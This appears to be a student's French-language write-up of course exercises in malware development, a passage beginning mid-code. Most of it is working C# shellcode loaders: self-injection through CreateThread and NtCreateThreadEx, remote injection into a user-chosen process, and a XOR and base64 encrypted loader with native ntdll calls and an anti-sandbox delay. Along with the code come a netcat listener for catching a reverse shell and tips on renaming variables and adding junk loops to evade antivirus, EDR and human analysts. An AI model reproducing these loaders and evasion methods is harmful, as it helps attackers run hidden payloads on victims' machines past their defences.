        uint tid; IntPtr thread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out tid);
        WaitForSingleObject(thread, 0xFFFFFFFF);
    }
}
```

maintenant qu'on à l'exe AV_evasion, avant l'execution sur la machine victime, pour s'assurer que ça fonctionne, on va lancé une écoute pour vérifier qu'on obtiens bien un reverse_shell comme désiré pour l'exercice.

### lancer une écoute

depuis linux c'est facile avec netcat on fait la commande `nc -lvp 443` et on est en écoute sur le port 443.

sous windows il faut installer un petit outil pour le faire.

- on dl [nmap + ncat](https://nmap.org/dist/nmap-7.92-setup.exe) on l'installe et on vérifie que dans les composant à installer ncat est bien coché.

une fois installé on peu dans un **terminal de commande**
vérifier l'installation `ncat -v`
lancer l'écoute `ncat -lvp 443` l=listen v=verbose p=port

## executer le payload sur l'hote victime

maintenant sur le pc victime on execute le payload et on voit ce qu'il se passe sur la machine de developpement.

on obtien un shell sur la machine victime

On vérifie que ça fonctionne en lisant depuis la machine dev un fichier test sur la machine cible
`type test.txt` on voit le contenu s'afficher.

### Observation

malgré les essais de cammouflé le payload et l'utilisation d'encryptage, cela ne permet pas de passer sous les radar de defender. il faut savoir que msfvenom est destiné à but éducatif et donc que tout ce qui est généré par msfvenom sera détécté par les AV classiques même les plus basique.

## Exercice bonus 1 :

Pour cet exercice, j'ai modifié le payload de départ pour utiliser NtCreateThreadEX.

après quelques recherches et quelques essais, voici le fichier qui fonctionne :

```csharp
using System;
using System.Runtime.InteropServices;
using System.Diagnostics; // Nécessaire pour Process.GetCurrentProcess()

namespace Loader
{
    public class BasicShellcodeLoader
    {
        public const uint EXECUTEREADWRITE = 0x40;
        public const uint COMMIT_RESERVE = 0x3000;
        public const uint THREAD_ALL_ACCESS = 0x1FFFFF;

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);

        // Remplacement de CreateThread par NtCreateThreadEx (Native API)
        [DllImport("ntdll.dll")]
        static extern uint NtCreateThreadEx(
            out IntPtr thread,
            uint access,
            IntPtr objAttr,
            IntPtr proc,
            IntPtr start,
            IntPtr param,
            uint flags,
            IntPtr stackZero,
            IntPtr stackRange,
            IntPtr stackCommit,
            IntPtr teb
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern UInt32 WaitForSingleObject(IntPtr hHandle, Int32 dwMilliseconds);

        public static void Main()
        {
            // Le shellcode original
            byte[] sc = new byte[312] {0xfc,0x48,0x81,0xe4,0xf0,0xff,
            0xff,0xff,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
            0x48,0x31,0xd2,0x51,0x65,0x48,0x8b,0x52,0x60,0x56,0x48,0x8b,
            0x52,0x18,0x48,0x8b,0x52,0x20,0x4d,0x31,0xc9,0x48,0x0f,0xb7,
            0x4a,0x4a,0x48,0x8b,0x72,0x50,0x48,0x31,0xc0,0xac,0x3c,0x61,
            0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,
            0xed,0x52,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x41,0x51,0x48,
            0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,
            0x00,0x00,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,
            0x67,0x48,0x01,0xd0,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x50,
            0x49,0x01,0xd0,0xe3,0x56,0x4d,0x31,0xc9,0x48,0xff,0xc9,0x41,
            0x8b,0x34,0x88,0x48,0x01,0xd6,0x48,0x31,0xc0,0x41,0xc1,0xc9,
            0x0d,0xac,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
            0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,
            0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,
            0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x41,0x58,0x48,0x01,0xd0,
            0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,
            0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
            0x8b,0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0xe8,0x0b,0x00,0x00,
            0x00,0x75,0x73,0x65,0x72,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00,
            0x59,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x49,0xc7,0xc1,
            0x00,0x00,0x00,0x00,0xe8,0x14,0x00,0x00,0x00,0x53,0x61,0x6c,
            0x75,0x74,0x20,0x6c,0x61,0x20,0x63,0x6f,0x6d,0x70,0x61,0x67,
            0x6e,0x69,0x65,0x21,0x00,0x5a,0xe8,0x07,0x00,0x00,0x00,0x45,
            0x72,0x72,0x6f,0x72,0x21,0x00,0x41,0x58,0x48,0x31,0xc9,0x41,
            0xba,0x45,0x83,0x56,0x07,0xff,0xd5,0x48,0x31,0xc9,0x41,0xba,
            0xf0,0xb5,0xa2,0x56,0xff,0xd5};

            int scSize = sc.Length;

            // Allocation de la mémoire
            IntPtr payAddr = VirtualAlloc(IntPtr.Zero, scSize, COMMIT_RESERVE, EXECUTEREADWRITE);

            // Copie du shellcode en mémoire
            Marshal.Copy(sc, 0, payAddr, scSize);

            // Préparation du handle pour le nouveau thread
            IntPtr hThread = IntPtr.Zero;

            // Exécution via NtCreateThreadEx
            NtCreateThreadEx(
                out hThread,
                THREAD_ALL_ACCESS,
                IntPtr.Zero,
                Process.GetCurrentProcess().Handle,
                payAddr,
                IntPtr.Zero,
                0,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero
            );

            // Attente indéfinie que le thread se termine
            WaitForSingleObject(hThread, -1);
        }
    }
}
```

### observation

Le fichier passe toujours sous le radar de defender comme la première version. le comportement reste le même.

## exercice 2 bonus :

dans cette version on va utilisé une fonction pour pouvoir configurer le processus cible ou le créer s'il n'existe pas encore.

après lecture des sources suivantes :
[Process.GetProcessesByName Method](https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.process.getprocessesbyname?view=net-10.0)
[user input](https://www.w3schools.com/cs/cs_user_input.php)
et recherche d'informations complémentaires et quelques essais, voici le code qui fonctionne.
dans ce programme on va demander à l'utilisateur le nom du processus, une vérification vérifie s'il existe, si pas il le démarre grâce à Process.Start et va récupérer le nouveau PID et continue ensuite comme prévu.

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Threading; // Ajouté pour le Thread.Sleep

namespace maldev_or_olinet
{
    class Program
    {
        // Déclarations des API Windows (P/Invoke) nécessaires
        [Flags] public enum ProcessAccessFlags : uint { All = 0x001F0FFF }
        [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr OpenProcess(ProcessAccessFlags access, bool inherit, int pid);
        [Flags] public enum AllocType { Commit = 0x1000, Reserve = 0x2000 }
        [Flags] public enum MemProtect { ExecuteReadWrite = 0x40 }
        [DllImport("kernel32.dll", SetLastError = true)] static extern IntPtr VirtualAllocEx(IntPtr hProc, IntPtr addr, uint size, AllocType type, MemProtect protect);
        [DllImport("kernel32.dll", SetLastError = true)] public static extern bool WriteProcessMemory(IntPtr hProc, IntPtr baseAddr, byte[] buffer, int size, out IntPtr written);
        [DllImport("kernel32.dll")] static extern IntPtr CreateRemoteThread(IntPtr hProc, IntPtr attr, uint stack, IntPtr start, IntPtr param, uint flags, IntPtr id);
        [DllImport("kernel32.dll", SetLastError = true)] public static extern bool CloseHandle(IntPtr handle);
        [DllImport("kernel32.dll", SetLastError = true)] public static extern UInt32 WaitForSingleObject(IntPtr handle, Int32 ms);

        public static void Main()
        {
            // Shellcode d'origine du fichier exo 2
            byte[] sc = new byte[276] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
            0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
            0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
            0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
            0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
            0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
            0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,
            0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
            0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
            0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
            0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
            0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
            0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
            0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
            0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
            0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
            0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
            0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
            0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,
            0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,
            0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,
            0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,
            0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
            0x63,0x2e,0x65,0x78,0x65,0x00};
            int len = sc.Length;

            // --- DEBUT DES MODIFICATIONS ---

            Console.Write("Entrez le nom du processus cible (ex: notepad) : ");
            string targetInput = Console.ReadLine();

            // sécurité/cast : si l'utilisateur entre "notepad.exe", on enlève le .exe pour la recherche
            // GetProcessesByName cherche sans l'extension.
            string targetNameForSearch = targetInput.Replace(".exe", "");

            int pid = 0;

            // 1. On cherche si le processus existe déjà
            Process[] procs = Process.GetProcessesByName(targetNameForSearch);

            if (procs.Length > 0)
            {
                // Le processus existe, on prend le premier trouvé
                pid = procs[0].Id;
                Console.WriteLine($"[+] Processus '{targetNameForSearch}' trouvé avec le PID : {pid}");
            }
            else
            {
                // 2. Le processus n'existe pas, on le crée
                Console.WriteLine($"[-] Processus '{targetInput}' introuvable. Tentative de création...");

                try
                {
                    // On démarre le processus
                    Process p = Process.Start(targetInput);

                    // On attend un court instant pour être sûr que le PID est attribué
                    if (p != null)
                    {
                        // WaitForInputIdle force le programme à attendre que le processus graphique soit prêt
                        p.WaitForInputIdle();
                        pid = p.Id;
                        Console.WriteLine($"[+] Processus créé avec succès. PID : {pid}");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Erreur lors de la création du processus : {ex.Message}");
                    return; // On arrête tout si on ne peut pas créer la cible
                }
            }



            // Suite de l'injection qui utilise la variable 'pid' dynamique
            Console.WriteLine($"[*] Début de l'injection dans PID {pid}...");

            IntPtr hProc = OpenProcess(ProcessAccessFlags.All, false, pid);
            if (hProc == IntPtr.Zero) { Console.WriteLine($"OpenProcess fail: {Marshal.GetLastWin32Error()}"); return; }

            IntPtr mem = VirtualAllocEx(hProc, IntPtr.Zero, (uint)len, AllocType.Commit | AllocType.Reserve, MemProtect.ExecuteReadWrite);
            if (mem == IntPtr.Zero) { Console.WriteLine($"AllocEx fail: {Marshal.GetLastWin32Error()}"); CloseHandle(hProc); return; }

            IntPtr written;
            if (!WriteProcessMemory(hProc, mem, sc, len, out written)) { Console.WriteLine($"Write fail: {Marshal.GetLastWin32Error()}"); CloseHandle(hProc); return; }
            Console.WriteLine($"Wrote {written} bytes");

            IntPtr thread = CreateRemoteThread(hProc, IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
            if (thread == IntPtr.Zero) { Console.WriteLine($"RemoteThread fail: {Marshal.GetLastWin32Error()}"); CloseHandle(hProc); return; }

            WaitForSingleObject(thread, -1);
            CloseHandle(hProc); CloseHandle(thread);
            Console.WriteLine("Injection done. Calc opened?");
            Console.ReadLine();
        }
    }
}
```

### Observation

ici on doit écrire le nom du programme voulu ex notepad et on à bien la calculatrice qui s'ouvre comme c'est voulu dans le malware.

## exercice bonus 3

Pour cet exercice, je vais combiner deux concepts :

- L'évasion EDR en contournant les appels de fonction de haut niveau (kernel32.dll, virtualallox, createthread, ...) en utilisant les API natives (ntdll.dll,NtAllocateVirtualMemory, NtCreateThreadEx) avec DllImport pour ne pas avoir de dépendances externes.

- l'Obfuscation pour éviter la détection statique en masquant les strings (comme ntdll.dll par exemple), en renomant les variables pour éviter les mots clés détéctés (shellcode, payload, etc..) et casser la signature.

Après plusieurs essais et modifications selon les alertes, je me suis arrêté sur cette version :
on modifie le code pour l'encryptor:

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Encrypter
{
    internal class Program
    {
        private static byte[] xor(byte[] shell, byte[] KeyBytes)
        {
            for (int i = 0; i < shell.Length; i++)
            {
                shell[i] ^= KeyBytes[i % KeyBytes.Length];
            }
            return shell;
        }
        static void Main(string[] args)
        {
            //XOR Key - It has to be the same in the Droppr for Decrypting
            string key = "H4cK3urP45510N";

            //Convert Key into bytes
            byte[] keyBytes = Encoding.ASCII.GetBytes(key);

            //Original Shellcode here (csharp format)
            byte[] buf = new byte[] {
    0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
    0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,
    0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
    0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,
    0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
    0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,
    0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
    0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,
    0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
    0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
    0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
    0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,
    0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,
    0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,
    0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
    0x63,0x2e,0x65,0x78,0x65,0x00
};

            //XORing byte by byte and saving into a new array of bytes
            byte[] encoded = xor(buf, keyBytes);
            Console.WriteLine(Convert.ToBase64String(encoded));
        }
    }
}
```

**Il faut maintenant le lancé pour récupérer la clé xor+base64**

```csharp
tHzgr8OdslA0NXRgcR4aZTUDAqcXGL9nVXm7HFB86BkTPfkiZH06hnoEBQWqAwK13mxVSTcdEA+J/W4KMrSQvWZ0ZHm7HGi/IXd7dKLbtL01MTAGzfQXLHt0ogC/fS11uw5ofWKb0CM6r/10vgW4BkniLnr6PUOQmHT0+D0PSfVbq0aEPlN4ET10CZ897DsPuDVWGTXlU3C7QgBw6AsvPHOAdb4xuXhPmHU7CmsrKwp1bXRocRQAt49rcieNsGx0bGt4xVrdNLTMii8YjjQ1MTBOSDRjA774c1E0NXSLAcUns5yeiIXH8mJ0j5el89XLtgOwsVpsMkk/scuuPTHYDCAHHTo0bHS46rGdVwInUFsXKFE1
```

```csharp
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Diagnostics;
using System.Threading;

namespace BonusExercice3
{
    class Program
    {
        // --- CONSTANTES ---
        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint PAGE_READWRITE = 0x04;    // RW
        const uint PAGE_EXECUTE_READ = 0x20; // RX

        // --- IMPORTS NATIFS ---
        [DllImport("ntdll.dll")]
        public static extern uint NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);

        [DllImport("ntdll.dll")]
        public static extern uint NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);

        [DllImport("ntdll.dll")]
        public static extern uint NtCreateThreadEx(out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, uint stackZeroBits, uint sizeOfStackCommit, uint sizeOfStackReserve, IntPtr bytesBuffer);

        [DllImport("kernel32.dll")]
        public static extern uint WaitForSingleObject(IntPtr handle, uint ms);

        // --- DECHIFFREMENT ---
        private static byte[] DecryptXor(byte[] input, byte[] key)
        {
            byte[] output = new byte[input.Length];
            for (int i = 0; i < input.Length; i++)
            {
                output[i] = (byte)(input[i] ^ key[i % key.Length]);
            }
            return output;
        }

        static void Main()
        {
            // 1. Petite pause (Anti-Sandbox)
            Thread.Sleep(1000);


            string dataBS64 = "tHzgr8OdslA0NXRgcR4aZTUDAqcXGL9nVXm7HFB86BkTPfkiZH06hnoEBQWqAwK13mxVSTcdEA+J/W4KMrSQvWZ0ZHm7HGi/IXd7dKLbtL01MTAGzfQXLHt0ogC/fS11uw5ofWKb0CM6r/10vgW4BkniLnr6PUOQmHT0+D0PSfVbq0aEPlN4ET10CZ897DsPuDVWGTXlU3C7QgBw6AsvPHOAdb4xuXhPmHU7CmsrKwp1bXRocRQAt49rcieNsGx0bGt4xVrdNLTMii8YjjQ1MTBOSDRjA774c1E0NXSLAcUns5yeiIXH8mJ0j5el89XLtgOwsVpsMkk/scuuPTHYDCAHHTo0bHS46rGdVwInUFsXKFE1";

            string keyStr = "H4cK3urP45510N";

            Console.WriteLine("[*] Déchiffrement...");
            byte[] shellcode = DecryptXor(Convert.FromBase64String(dataBS64), Encoding.ASCII.GetBytes(keyStr));

            // On s'injecte soi-même (Self-Injection)
            IntPtr hProc = Process.GetCurrentProcess().Handle;
            IntPtr baseAddr = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)shellcode.Length;

            // 3. Allocation (RW)
            NtAllocateVirtualMemory(hProc, ref baseAddr, IntPtr.Zero, ref regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            // 4. Copie du shellcode
            Marshal.Copy(shellcode, 0, baseAddr, shellcode.Length);

            // 5. Protection (RX) - On change les droits juste avant d'exécuter
            uint oldProtect = 0;
            NtProtectVirtualMemory(hProc, ref baseAddr, ref regionSize, PAGE_EXECUTE_READ, out oldProtect);

            // 6. Exécution via Thread Natif
            IntPtr hThread = IntPtr.Zero;
            NtCreateThreadEx(out hThread, 0x1FFFFF, IntPtr.Zero, hProc, baseAddr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);

            // On attend juste assez pour que la calc se lance, puis on quitte
            WaitForSingleObject(hThread, 0xFFFFFFFF);

            // Le programme se ferme, la calculatrice reste.
        }
    }
}
```

cette version est plus longue et plus pénible à lire, j'ai donc commenté les modifications car cela devenait compliqué de s'y retrouver pourtant en sachant ce qu'on veut faire et comment. pour l'astuce, de la partie obfuscation, on peu dans visual studio renommer une varibale partout dans le document en une fois avec ctrl + h c'est assez pratique une fois que le code fonctionne on peu facilement utilisé ce raccourcis pour obfusqué le nom des variables et on peu aussi ajouté des boucles inutiles dans lesquels on ne vas pas rentré dedans ou au contraire dans lesquelles peu importe le scénario, l'issue de la boucle sera toujours la même. cela ralenti l'analyse, complexifie le code et permet de trompé aussi l'humain qui pourrait vérifier éventuellement.

### Observation

Malgré les systèmes mis en place pour ne pas être détecté par defender ou un EDR, le fait d'utiliser msfvenom pour le cours rendra systématique la détection.

# Conclusion

Pour conclure cette série d'exercices, il apparaît clairement que la compréhension approfondie du fonctionnement des EDR et des antivirus est un prérequis indispensable à toute tentative d'évasion. Nous avons vu que le contournement des signatures repose sur une combinaison de techniques : l'obfuscation du code, l'insertion de code mort ("junk code") pour altérer l'analyse statique, et surtout l'usage de shellcodes personnalisés et chiffrés (via XOR ou AES).

Néanmoins, il est rassurant de constater que les ressources malveillantes publiques sont rapidement identifiées et bloquées par des solutions comme Windows Defender. Cette réactivité défensive nous rappelle que la sécurité est une course constante entre l'attaquant et le défenseur, où seule une personnalisation poussée permet encore de passer sous les radars.
